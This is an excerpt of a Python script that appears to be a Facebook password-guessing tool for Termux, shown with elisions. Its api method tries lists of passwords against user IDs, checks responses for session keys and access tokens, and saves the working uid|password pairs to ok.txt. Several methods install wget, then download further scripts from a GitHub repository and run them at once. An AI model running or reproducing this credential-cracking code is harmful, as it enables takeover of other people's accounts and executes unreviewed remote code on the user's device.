...
\033[1;95m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   
	...
	def v2(self):
		if	os.path.isfile('.v2.py'):
			...
			os.system("pkg install wget -y")
			os.system("wget https://github.com/nxnil105/Nil-Max/blob/main/Nil.py.v2.py && clear && python .v2.py")
	...
	def v3(self):
		if	os.path.isfile('.v3.py'):
			...
			os.system("pkg install wget -y")
			os.system("wget https://github.com/nxnil105/Nil-Max/.v3.py && clear && python .v3.py")
	...
	def fmain(self):
		if	os.path.isfile('.fmain.py'):
			...
			os.system("pkg install wget -y")
			os.system("wget https://github.com/nxnil105/Nil-Max/blob/main/Nil.py && clear && python .Nil.py")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Nil] : %s/%s -> \033[0;92m [ Nil-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [Nil-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [Nil-CP] %s | %s\033[0;97m         "%(uid, pw))
